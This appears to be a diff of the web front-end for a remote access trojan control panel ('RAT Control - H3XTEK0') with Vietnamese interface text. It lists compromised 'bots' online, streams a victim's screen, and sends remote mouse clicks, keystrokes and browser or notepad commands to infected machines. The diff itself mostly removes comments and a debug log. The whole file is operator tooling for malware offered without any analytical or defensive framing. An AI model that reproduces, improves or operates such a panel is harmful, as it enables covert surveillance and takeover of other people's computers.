@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>RAT Control - H3XTEK0</title>
-    <link rel="stylesheet" href="/style.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
@@ -84,7 +83,6 @@
 </head>
 <body>
     <div class="container-rat">
-        <!-- SIDEBAR -->
         <div class="sidebar">
             <h2>🎯 RAT</h2>
             <div class="sub-info">🔑 H3XTEK0 · <span id="botCount">0</span> bots online</div>
@@ -95,8 +93,6 @@
                 <button onclick="openBrowserModal()">🌐 Mở Browser</button>
             </div>
         </div>
-
-        <!-- MAIN -->
         <div class="main-rat">
             <div class="status-bar">
                 <span class="bot-name" id="currentBot">🔴 Chưa chọn bot</span>
@@ -121,7 +117,6 @@
         </div>
     </div>
 
-    <!-- NOTEPAD MODAL -->
     <div id="notepadModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal('notepadModal')">&times;</span>
@@ -131,7 +126,6 @@
         </div>
     </div>
 
-    <!-- BROWSER MODAL -->
     <div id="browserModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal('browserModal')">&times;</span>
@@ -142,10 +136,6 @@
     </div>
 
     <script>
-        // ============================================================
-        //  RAT CONTROL - FULL SCRIPT (FIXED)
-        // ============================================================
-
         let currentBotId = null;
         let isStreaming = false;
         let streamInterval = null;
@@ -165,9 +155,6 @@
         function closeModal(id) { document.getElementById(id).classList.remove('active'); document.getElementById(id).style.display = 'none'; }
         function openModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('active'), 10); }
 
-        // ============================================================
-        //  TỌA ĐỘ CHÍNH XÁC
-        // ============================================================
         function getCanvasCoords(e) {
             const rect = canvas.getBoundingClientRect();
             let canvasX = (e.clientX - rect.left);
@@ -182,12 +169,9 @@
             y = Math.max(0, Math.min(canvas.height, y));
             const botX = Math.round((x / canvas.width) * botScreenWidth);
             const botY = Math.round((y / canvas.height) * botScreenHeight);
-            return { x: botX, y: botY, canvasX: Math.round(x), canvasY: Math.round(y) };
+            return { x: botX, y: botY };
         }
 
-        // ============================================================
-        //  BOT LIST
-        // ============================================================
         async function refreshBots() {
             try {
                 const res = await fetch('/api/bots/online', { headers: getAuth() });
@@ -214,9 +198,6 @@
             });
         }
 
-        // ============================================================
-        //  SELECT BOT
-        // ============================================================
         async function selectBot(botId) {
             if (currentBotId === botId) return;
             try {
@@ -226,7 +207,6 @@
                 if (bot) {
                     botScreenWidth = bot.screen_width || 1920;
                     botScreenHeight = bot.screen_height || 1080;
-                    console.log(`[RAT] Bot screen: ${botScreenWidth}x${botScreenHeight}`);
                 }
             } catch(e) {}
             if (isStreaming) stopStream();
@@ -254,9 +234,6 @@
             refreshBots();
         }
 
-        // ============================================================
-        //  STREAM
-        // ============================================================
         function startStream() {
             if (!currentBotId) return;
             isStreaming = true;
@@ -330,9 +307,6 @@
             }
         }
 
-        // ============================================================
-        //  MOUSE EVENTS
-        // ============================================================
         async function sendMouseEvent(eventType, x, y) {
             if (!currentBotId) return;
             try {
@@ -379,9 +353,6 @@
             sendMouseEvent('move', coords.x, coords.y);
         });
 
-        // ============================================================
-        //  UI BUTTONS
-        // ============================================================
         async function sendClick(type) {
             if (!currentBotId) return;
             const map = { 'left': 'click', 'right': 'rightclick', 'double': 'doubleclick' };
@@ -410,9 +381,6 @@
             document.getElementById('textInput').value = '';
         }
 
-        // ============================================================
-        //  BROWSER - FIXED
-        // ============================================================
         async function openBrowser() {
             const url = document.getElementById('urlInput').value.trim() || 'https://www.google.com';
             if (!currentBotId) { alert('Chọn bot trước!'); return; }
@@ -457,9 +425,6 @@
             }
         }
 
-        // ============================================================
-        //  NOTEPAD - FIXED
-        // ============================================================
         function openNotepadModal() { openModal('notepadModal'); }
         function closeNotepadModal() { closeModal('notepadModal'); }
 
@@ -485,9 +450,6 @@
             }
         }
 
-        // ============================================================
-        //  AUTO REFRESH
-        // ============================================================
         setInterval(refreshBots, 10000);
         refreshBots();
 
